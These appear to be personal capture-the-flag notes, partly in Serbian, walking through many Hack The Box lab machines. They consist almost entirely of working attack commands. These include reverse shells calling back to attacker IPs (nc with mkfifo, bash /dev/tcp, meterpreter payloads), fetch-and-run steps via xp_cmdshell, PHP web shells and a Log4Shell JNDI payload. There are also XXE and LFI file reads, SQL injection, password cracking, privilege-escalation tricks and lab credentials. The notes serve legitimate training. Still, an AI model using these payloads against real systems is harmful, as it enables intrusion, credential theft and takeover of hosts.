cyberjazz.de,mytechonit.com
****************************FAWN*********************************************************
ftp 1.1.1.1
anonymous -> help(for more commands) -> ls -> get blabla.txt
*****************************Dancing ****************************************************
client-server model - architecture model!!!
smbclient -L 1.1.1.1
smbclient \\\\1.1.1.1\\ADMIN$
******************************Sequel*****************************************************
nmap -sC -sS -sV 11.1.1.1  -oA sequel   create file simultaneously
mysql -u root -h 10.129.11.201 
show databases;
use htb; 
show tables;
SELECT * FROM config;
***************************Crocodile******************************************************
install gobuster
gobuster dir -u 1.1.1.1 -w /usr/share/dirb/wordlists/common.txt -x .php
-x in gobuster looking to specific language filetypes
/login.php -> kredencijali su u prethodno skinutim ftp fajlovima !!!
************************Responder***********************************************************
winRM,NTLM

sudo nmap -p0-65535  -T5 10.129.102.230 --min-rate 5000 --> scan all ports
google 5985,6 --> winrm    --> gem install evil-winrm
gobuster dir -u 10.129.102.230 -w /usr/share/dirb/wordlist/common.txt 
also nikto -host unika.htb
/etc/hosts - add IP and hostname and they will not be directed
../../../../../../../../windows/system32/drivers/etc/hosts    <--------------  WINDOWS LFI
sudo python -m http.server 8080   --- raise python server
http://unika.htb/index.php?page=//nasaIP/somefile
responder tool for checking interface - check on google for which purpose tool is capable
sudo responder -I tun0  ; ponovimo request --> http://unika.htb/index.php?page=//nasaIP/somefile python server on our local machine is raised!!
we are getting hash value unika servera  -> save in some txt
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt  imeNasegFajla

evil-winrm -i 10.129.208.247 -u Administrator -p badminton
************************************ARHCETYPE*************************************************************
smbclient \\\\1.1.1.1\\ADMIN$ -U=admin%admin
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
git clone https://github.com/SecureAuthCorp/impacket.git   --> cd impacket  --> pip3 install .
LOCATE!!! mssqlclient.py
python3 examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.97.118 -windows-auth --> (moze i ovako) mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.168.147 -windows-auth
help --> for more options
enable_xp_cmdshell --> xp_cmdshell dir --> xp_cmdshell whoami --> xp_cmdshell "powershell -c pwd"
ONE WAY-CYBEREXPERT <---- User flag with NC help
create a stable reverse shell:
download nc.exe --> https://github.com/int0x33/ndirc.exe/blob/master/nc.exe
navigate to the download folder nc.exe and run --> sudo python3 -m http.server 80
EXEC xp_cmdshell “powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.214/nc.exe -outfile nc.exe”  we are transfer file from our python server
we have to exeute on SQL console:  -->  xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -lvnp 443 -e cmd.exe"
on our terminal: -->  nc 10.129.168.147 443  dobijamo reverse shell pristup!!!!

Second flag --> windPEAS <-- Administrator flag we need!!
winPEAS --> https://github.com/carlospolop/PEASS-ng/releases/download/20220501/winPEASx64.exe -> local python server
sql server -> EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.214/winPEASx64.exe -outfile winPEASx64.exe"
odemo na SQL server  C:\Users\sql_svc\Downloads i run .\winPEASx64.exe
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
type ConsoleHost_history.txt
we are going to Kali where is impacket -> python3 examples/psexec.py administrator@boxIP  --> passowrd is MEGACORP_4dm1n!!
b91ccec3305e98240082d4474b848528 admin flag
-->SECOND WAY-CYBERCAT<---
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.168.147 -windows-auth   from impacket/examples
msfvenom
msfvenom -p windows/meterpreter/reverse_tcp 10.10.14.214 -f exe -o payload.exe
msfconsole
search port 443 --- help when you want to find something in metasploit
use exploit/multi/handler  --> set payload windows/meterpreter/reverse_tcp --> setg LHOST 10.10.14.214  --> run

msfvenom -l payloads | grep windows --> list of payloads
mv payload.exe /Desktop
python -m http.server
SQL> xp_cmdshell "powershell -c cd C:/Users/Public; wget http://10.10.14.214/payload.exe; ./payload.exe"  --> in meterpreter should get connection --> getuid
meterpreter -> run -> example - post/windows/gather --> seriosly run post/mulitp/recon/local_exploit_suggester  -> check for potential!!
meterpreter pwd --> upload ../Desktop/winPeasX64.exe    --> execute -f winPeasX64.exe --> shell --> winPeaseX64.exe
if evil-winrm port is opened 5985 --> evil-winrm -u administrator -p 'MEGACORP_4adm1n!!' -i ipadresaservera 

************************************************************Oopse*********************************************************
/cdn-cgi/login/  --> login as Guest  --> change in web developer console cookies into admin & cookie number and we can upload files :)!!
revshells --> PHP exec mozemo kreirati payload --> kreiramo nas:
<?php system($_GET['cmd']); ?>  in Vim
is it code uploded?? gobuster dir -u http://10.129.142.18/uploads -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php
http://10.129.142.18/uploads/shell.php?cmd=ls  -- check
nc -lvnp 9001 in one terminal --> add in Burp repeater from previos request session (check)
---> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.186 1337 >/tmp/f   --- BINGO reverse shell!!!
python3 -c 'import pty;pty.spawn("/bin/bash");' -- get more user frendly access in terminal
ctrl+z = background terminal --> stty raw -echo --> export TERM=xterm
review files and check login script in cgn-cdi
grep -R -i "pass" *   --> get admin pass --> get db.php - robert credentials - su robert and M3g4C0rpUs3r!   BINGO!!
sudo -l - what is running as sudo
find / -group bugtracker 2>/dev/null   --> find bugracker group  --> /usr/bin/bugtracker Bug ID = ../root.txt =jedan nacin
drugi nacin:
find / -perm -4000 -type f 2>/dev/null  -->  trazimo cat ---> echo $PATH --> echo PATH=/tmp:$PATH -> echo $PATH to check  --> cd /tmp -> 
vim cat --> /bin/cat  -> chmod+x cat --> again run /usr/bin/tracker  BUG ID=123 -> root shell = whoami :)

*********************************************************************Vaccine*******************************************************************
backup.zip under password --> zip2john backup.zip > johnhash 
john --wordlist=/usr/share/wordlists/rockyou.txt johnhash  
hashid 2cb42f8734ea607eefed3b70af13bbd3 --> hashcat -m 0 2cb42f8734ea607eefed3b70af13bbd3 /usr/share/wordlists/rockyou.txt
crackstation.net  
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hashfile
' OR '1'='1  --> sqlmap -hh --> put from Burp simple get request with something in search bar and copy into file
sql -r newreq  --> sql -r newreq --tables --> cars
sql -r newreq --os-shell-> nc mkfifo(reverseshell.net) 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.186 1337 >/tmp/f ALSO  nc -lvnp 1337
find / -perm -4000 -type f 2>/dev/null --> cd /var/www -> grep -R -i "pass" *   what is running as root!!!
sudo -l
GTFOBins --> set shell=/bin/sh
ssh postgres@vaccine.htb  P@s5w0rd!  --> /bin/vi /etc/postgresql/11/main/pg_hba.conf  --> (ne radi -> set shell=/bin/sh --> shell)
:!/bin/bash    <-- radi!!!
*****************************************************Unified****************************************************************************
CVE CVE-2021-44228  --> https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi#exploit
https://github.com/puzzlepeaches/Log4jUnifi
sudo tcpdump -i tun0 port 1389  -> in the Burp catch random post credentials and add ${jndi:ldap://NASAIPADRESA:1389/o=tomcat} na primer:
{"username":"admin","password":"admin","remember":
"${jndi:ldap://NASAIPADRESA/o=tomcat}","strict":true}   RADI! WIRESHARK CAPTURE ON TUN0 -> RADI ... next step reverse shell..
sudo apt-get install maven
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package

echo 'bash -c bash -i >&/dev/tcp/10.10.15.186/4444 0>&1' | base64
java -jar /target/RogueJndi-1.1.jar --command "bash -c {echo,prethodniBase64-YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTg2LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.186"
send again requrest in Burp --> nc -lvnp 4444  yess -> script /dev/null -c bash da dobijemo bash shell  ..next step post explatation

mvn --version
what version mongo is running - ps aux | grep mongo
https://erikdekker.net/
default db name is ace
db.admin.insert()
mongo --port 27117 ace  BINGO SHELL!!!
db.admin.find().forEach(printjson);

Reset the password for an administrative user.SHADOW ADMIN:
MAKE YOUR OWN PASS AND INJECT -> mkpasswd -m sha-512 <PASSWORD>
db.admin.insert({ "email" : "name@localhost.local", "last_site_name" : "default", "name" : "jezda", "time_created" : NumberLong(100019800), "x_shadow" : "<PASSWORD-HASH>" })
db.admin.find().forEach(printjson);  --check if we have account made
ssh root@ip   NotACrackablePassword4U2022
*********************************************Explosion************************************************************
sudo apt install freerdp2-shadow-x11 
xfreerdp /v:10.129.157.139 /cert:ignore /u:Administrator
*********************************************Bike************************************************************
Server Side Template Injection  SSRF -> {{7*7}}
templating engine in nodejs - handlers
Node.js and Python web backend servers often make use of a software called "Template Engines".
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection  == BURP intruder until root!
*********************************************Pennyworth************************************************************
Jenking fresh install default credentials
manage Jenkins - Script console  --> /scripts
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  -Groovy
(https://github.com/gquere/pwn_jenkins) optional
*********************************************Tactics************************************************************
Which Nmap switch can we use to enumerate machines when our packets are otherwise blocked by the Windows firewall?   -Pn
SMB port --> 445
smbclient -L 10.129.75.238 -U Administrator
smbclient //10.129.75.238/C$ -U Administrator
*********************************************Redeemer************************************************************
redis

6379 port  -- in nmap -p- -T5 brze je !!!
redis-cli -h 10.129.113.40 
results - info command
# Keyspace
db0:keys=4,expires=0,avg_ttl=0  --> select 0 --> keys * --> get <key> = bingo!
*********************************************Included************************************************************
sudo nmap -sU -top-ports=20
gobuster dir -u http://included.htb -w /usr/share/dirb/wordlists/common.txt 
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://included.htb/FUZZ
http://included.htb/?file=../../../etc/passwd
curl http://included.htb/?file=../../../etc/passwd --> tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
TFTP - basic file transfer function with no user authentication  --> sudo apt install tftp
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php  --> reverse shell.php
tftp serverIP -> put shell.php --> nc -lvnp 1234
curl 'http://{target_IP}/?file=/var/lib/tftpboot/shell.php'  --> python3 -c 'import pty;pty.spawn("/bin/bash");'
/var/www/html$: ls -al  --> cat .htpasswd -->mike:Sheffield19  = su mike i ukucamo password  - id and groups!!! LXD - trag
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools    -- install golang
git clone https://github.com/lxc/distrobuilder 
cd distrobuilder  --> make
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8

python3 -m http.server 8000
wget http://{local_IP}:8000/lxd.tar.xz
wget http://{local_IP}:8000/rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list

lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

lxc start privesc
lxc exec privesc /bin/sh

cd /mnt/root

*************************************************Markup********************************************************
Lets try to read /etc/passwd in different ways. For Windows you could try to read:
C:/windows/system32/drivers/etc/hosts
In this first case notice that SYSTEM "file:///etc/passwd" will also work.

<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<item>
&test;
</item>

Target Daniel (from source page)
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>

touch daniel --> copy key from Burp --> chmod 600 id_rsa --> !!!!!ostavi jedan prazan red poslednji!!!
ssh -i id_rsa daniel@10.129.95.192 

whoami /priv --> C:\
icacls job.bat

https://github.com/int0x33/nc.exe/blob/master/nc64.exe
python3 -m http.server 80
powershell --> ps (gledamo koji process radi kao admin):  nasli wevtutil radi kao admin!!!
wget http://10.10.15.113/nc64.exe -outfile nc64  exit from powershell!!  skidamo reverse shell na victim machine
echo "C:\Log-Management\nc64.exe -e cmd.exe 10.10.15.113 9001" > C:\Log-Management\job.bat   --> nasa masina nc -nlvp 9001 = bingo!!!
**********************************************************Tracks*********************************************************
FIND THE EASY PASS---
sha256sum file -> extract to folderName (unzip filename) --> file filename (proveriti za vise info)
sudo apt-get install libwine (help executable on linux)
sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install wine32
wine EasyPass.exe (filename) --> nece da otvori bez passworda --> in second tab open and install ollydbg (sudo apt install ollydbg)
sudo ollydbg EasyPass.exe
right click -> search for - all referenced text strings --> find (goodd job, congratulations) - mark one above breakpoint-toggle - try some testtest - cevrti prozor- pronaci testtest i ispod je password :)

WEAK RSA----
file weak ... - strings weak --- 
git clone https://github.com/Ganapati/RsaCtfTool.git
sudo apt-get install libgmp3-dev libmpc-dev
cd RsaCtfTool
pip3 install -r "requirements.txt"
python3 RsaCtfTool.py --publickey key.pub --private > privatekey.txt
https://gchq.github.io/CyberChef/ --> input file flag.enc -> RSA decrypt -> privatekey.txt 

***********************************************************LAME*************************************
ftp, smb, ssh
nmap
hack 135 SMB --> msfconsole - search samba 3.0.20 - when we get shell (shell -i)
*********************************************************Jerry ***************************************************
nmap
sudo apt -y install seclists --> find /usr/share/seclists | grep -i tomcat
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html -vV(gledamo u real time)
msfvenom -l payloads --> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.58 LPORT=9001 -f war -o PleaseSubsribe.war 
msfdb run --> use exploit/multi/handler --> set payload windows/x64/meterpreter/reverse_tcp --? set LHOST AND PORT
exploit -j  --runniing in background
upload to the tomcat portal war file - unzip malicious war file in tmp - add adadadasd.jsp in browser --> sessions -l --> sessions -i 1
type "2 for the price of 1.txt"
**************************************************NETMON************************************************************************************
PRTG, FTP,
https://github.com/A1vinSmith/CVE-2018-9276
ftp - anonymous - user.txt easy
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt  - fuzzing lFI bitne putanje na win
cd $RECYCLE.BIN
C:/WINDOWS/php.ini - CHECK
C:/WINDOWS/System32/drivers/etc/hosts - check
C:/Windows/win.ini  - check
C:/Windows/Panther/Unattended.xml   check
windows/windowsupdate.log - check for the last updates
windows/system32/license.rtf - check - is it windows 20108, 2012 etc.
programdata or windows/SoftwareDistribution - windows updates get placed

programdata%\Paessler\PRTG Network Monitor --> get PRTG Configuration.old.bak - search for password
<!-- User: prtgadmin -->
              PrTg@dmin2018
grep -B5 -A5 -i password PRTG\ Configuration.old.bak | sed 's/ //g'  | sort -u   --> upit za command line

nacin 1 - copy root.txt to user account -- nije dobar root.txt!!!!!
https://www.codewatch.org/blog/?p=453
PRTG-setup-account settings-notifications- add new - name blable - execute program - parameter 
test.txt; Copy-Item "C:\Users\Administrator\Desktop\root.txt" -Destination "C:\Users\Public\root.txt"  --> zvoncic send!!!!

DRUGI NACIN:
smbmap -u prtgadmin -p 'PrTg@dmin2019' -d netmon -H 10.10.10.152 --> probaj
prtg interface powershell parametar test | ping -n 1 10.10.14.58(nasa IP) --> tcpdump -i tun0 icmp -- we are checkign is it ping- zvoncic send!!
nishang tool**
python3 -m http.server 8080 (maybe is not needed)
nc -lvnp 9001
cat nishang-tool.ps1 |  iconv -t UTF-16LE | base64 -w0   - encoding tool
PRTG - please | powershell -enc  add encoded!!!!  --> send zvoncic -- Boom!!
-----------------------------------------------------------------------------------
Three - aws, php

echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
gobuster vhost -u erev0s.com -w awesome_wordlist.txt
gobuster dns -d erev0s.com -w awesome_wordlist.txt -i
gobuster dir -u ttp://thetoppers.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -d http://thetoppers.htb/
sudo apt install awscli  
aws configure   --> everything is temp
aws --endpoint=http://s3.thetoppers.htb s3 ls  -- list all buckets
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb - navigate in browser to http://thetoppers.htb/shell.php?cmd=id
http://thetoppers.htb/shell.php?cmd=ls+../
http://thetoppers.htb/shell.php?cmd=cat+../flag.txt

second way is not successfull:
#!/bin/bash   -- shell.sh  --> localmachine
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
nc -nvlp 1337  --> local machine
python3 -m http.server 8000  --> local machine
browser: http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash
---------------------------------------------------------------------------------------------------------------------------
